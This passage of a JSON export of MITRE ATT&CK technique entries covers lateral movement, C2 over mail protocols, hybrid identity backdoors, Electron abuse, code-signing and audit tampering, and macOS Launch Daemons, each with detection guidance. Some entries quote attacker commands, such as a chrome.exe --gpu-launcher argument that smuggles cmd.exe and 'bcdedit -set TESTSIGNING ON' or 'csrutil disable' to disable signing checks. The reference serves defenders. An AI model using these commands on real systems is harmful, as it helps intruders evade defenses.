      "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain, or management platforms for internal virtualization environments such as VMware vCenter. \n\nLegitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021",
      "stix_id": "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba",
      "created": "2017-05-31T21:30:29.858000+00:00",
      "modified": "2025-04-15T19:58:32.234000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "IaaS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Network Traffic: Network Connection Creation",
        "Command: Command Execution",
        "Network Share: Network Share Access",
        "WMI: WMI Creation",
        "Logon Session: Logon Session Creation",
        "Network Traffic: Network Traffic Flow",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement. \n\nUse of applications such as ARD may be legitimate depending on the environment and how it\u2019s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using these applications. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. \n\nIn macOS, you can review logs for \"screensharingd\" and \"Authentication\" event messages. Monitor network connections regarding remote management (ports tcp:3283 and tcp:5900) and for remote login (port tcp:22).(Citation: Lockboxx ARD 2019)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)"
    },
    "T1071.003": {
      "id": "T1071.003",
      "name": "Mail Protocols",
      "description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: FireEye APT28) ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1071.003",
      "stix_id": "attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b",
      "created": "2020-03-15T16:21:45.131000+00:00",
      "modified": "2025-04-15T19:58:32.320000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)"
    },
    "T1556.007": {
      "id": "T1556.007",
      "name": "Hybrid Identity",
      "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.007",
      "stix_id": "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f",
      "created": "2022-09-28T13:29:53.354000+00:00",
      "modified": "2025-04-15T22:40:10.913000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Module: Module Load",
        "Application Log: Application Log Content",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1595.002": {
      "id": "T1595.002",
      "name": "Vulnerability Scanning",
      "description": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1595.002",
      "stix_id": "attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4",
      "created": "2020-10-02T16:55:16.047000+00:00",
      "modified": "2025-04-15T23:19:33.981000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1059.009": {
      "id": "T1059.009",
      "name": "Cloud API",
      "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.009",
      "stix_id": "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf",
      "created": "2022-03-17T13:28:24.989000+00:00",
      "modified": "2025-04-15T19:58:32.612000+00:00",
      "platforms": [
        "IaaS",
        "SaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1596": {
      "id": "T1596",
      "name": "Search Open Technical Databases",
      "description": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1596",
      "stix_id": "attack-pattern--55fc4df0-b42c-479a-b860-7a6761bcaad0",
      "created": "2020-10-02T16:56:05.810000+00:00",
      "modified": "2025-04-15T23:04:02.249000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1218.015": {
      "id": "T1218.015",
      "name": "Electron Applications",
      "description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.(Citation: Electron 2) Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.(Citation: Electron 3) The Chromium engine is used to display web content and Node.js runs the backend code.(Citation: Electron 1)\n\nDue to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.(Citation: Electron 1) For example, the abuse of `teams.exe` and `chrome.exe` may allow adversaries to execute malicious commands as child processes of the legitimate application (e.g., `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe`).(Citation: Electron 6-8)\n\nAdversaries may also execute malicious content by planting malicious [JavaScript](https://attack.mitre.org/techniques/T1059/007) within Electron applications.(Citation: Electron Security)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.015",
      "stix_id": "attack-pattern--561ae9aa-c28a-4144-9eec-e7027a14c8c3",
      "created": "2024-03-07T19:32:35.383000+00:00",
      "modified": "2025-04-15T22:24:54.174000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1562.012": {
      "id": "T1562.012",
      "name": "Disable or Modify Linux Audit System",
      "description": "Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.(Citation: Red Hat System Auditing)(Citation: IzyKnows auditd threat detection 2022)\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.(Citation: Trustwave Honeypot SkidMap 2023)(Citation: ESET Ebury Feb 2014)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562.012",
      "stix_id": "attack-pattern--562e9b64-7239-493d-80f4-2bff900d9054",
      "created": "2023-05-24T19:03:03.855000+00:00",
      "modified": "2025-04-15T22:20:10.121000+00:00",
      "platforms": [
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "File: File Modification",
        "Command: Command Execution",
        "File: File Deletion",
        "Process: Process Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1207": {
      "id": "T1207",
      "name": "Rogue Domain Controller",
      "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1207",
      "stix_id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T15:15:34.258000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Modification",
        "Network Traffic: Network Traffic Content",
        "User Account: User Account Authentication",
        "Active Directory: Active Directory Object Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\n\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\n\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\n\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with \u201cGC/\u201d) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235\u20134B06\u201311D1-AB04\u201300C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete."
    },
    "T1553.006": {
      "id": "T1553.006",
      "name": "Code Signing Policy Modification",
      "description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.(Citation: Microsoft DSE June 2017)(Citation: Apple Disable SIP) Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.(Citation: Microsoft Unsigned Driver Apr 2017)(Citation: Apple Disable SIP)\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP)(Citation: FireEye HIKIT Rootkit Part 2)(Citation: GitHub Turla Driver Loader) Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS.(Citation: Microsoft TESTSIGNING Feb 2021)(Citation: Apple Disable SIP) Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.(Citation: F-Secure BlackEnergy 2014)\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.(Citation: Unit42 AcidBox June 2020)(Citation: GitHub Turla Driver Loader)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1553.006",
      "stix_id": "attack-pattern--565275d5-fcc3-4b66-b4e7-928e4cac6b8c",
      "created": "2021-04-23T01:04:57.161000+00:00",
      "modified": "2025-04-15T19:58:33.055000+00:00",
      "platforms": [
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as <code>bcdedit.exe -set TESTSIGNING ON</code>.(Citation: Microsoft TESTSIGNING Feb 2021) Consider monitoring for modifications made to Registry keys associated with code signing policies, such as <code>HKCU\\Software\\Policies\\Microsoft\\Windows NT\\Driver Signing</code>. Modifications to the code signing policy of a system are likely to be rare."
    },
    "T1610": {
      "id": "T1610",
      "name": "Deploy Container",
      "description": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1610",
      "stix_id": "attack-pattern--56e0d8b8-3e25-49dd-9050-3aa252f5aa92",
      "created": "2021-03-29T16:51:26.020000+00:00",
      "modified": "2025-04-15T19:58:33.230000+00:00",
      "platforms": [
        "Containers"
      ],
      "permissions_required": [],
      "data_sources": [
        "Container: Container Start",
        "Application Log: Application Log Content",
        "Pod: Pod Creation",
        "Container: Container Creation",
        "Pod: Pod Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for suspicious or unknown container images and pods in your environment. Deploy logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application pods to detect malicious activity at the cluster level. In Docker, the daemon log provides insight into remote API calls, including those that deploy containers. Logs for management services or applications used to deploy containers other than the native technologies themselves should also be monitored."
    },
    "T1112": {
      "id": "T1112",
      "name": "Modify Registry",
      "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\n\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification.(Citation: Microsoft Reg) Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\n\nThe Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).(Citation: Unit42 BabyShark Feb 2019)(Citation: Avaddon Ransomware 2021)(Citation: Microsoft BlackCat Jun 2022)(Citation: CISA Russian Gov Critical Infra 2018) The Registry may also be modified to [Impair Defenses](https://attack.mitre.org/techniques/T1562), such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.(Citation: CISA LockBit 2023)(Citation: Unit42 BabyShark Feb 2019)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.(Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\n\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API.(Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.(Citation: TrendMicro POWELIKS AUG 2014)(Citation: SpectorOps Hiding Reg Jul 2017)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1112",
      "stix_id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
      "created": "2017-05-31T21:31:23.587000+00:00",
      "modified": "2025-04-15T19:58:33.486000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "Process: OS API Execution",
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Deletion",
        "Windows Registry: Windows Registry Key Creation",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016)."
    },
    "T1543.004": {
      "id": "T1543.004",
      "name": "Launch Daemon",
      "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1543.004",
      "stix_id": "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba",
      "created": "2020-01-17T19:23:15.227000+00:00",
      "modified": "2025-04-15T19:58:33.604000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Creation",
        "File: File Modification",
        "Service: Service Modification",
        "Command: Command Execution",
        "Service: Service Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for new files added to the <code>/Library/LaunchDaemons/</code> folder. The System LaunchDaemons are protected by SIP.\n\nSome legitimate LaunchDaemons point to unsigned code that could be exploited. For Launch Daemons with the <code>RunAtLoad</code> parameter set to true, ensure the <code>Program</code> parameter points to signed code or executables are in alignment with enterprise policy. Some parameters are interchangeable with others, such as <code>Program</code> and <code>ProgramArguments</code> parameters but one must be present.(Citation: launchd Keywords for plists)\n\n"
    },
    "T1580": {
      "id": "T1580",
      "name": "Cloud Infrastructure Discovery",
      "description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket\u2019s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and 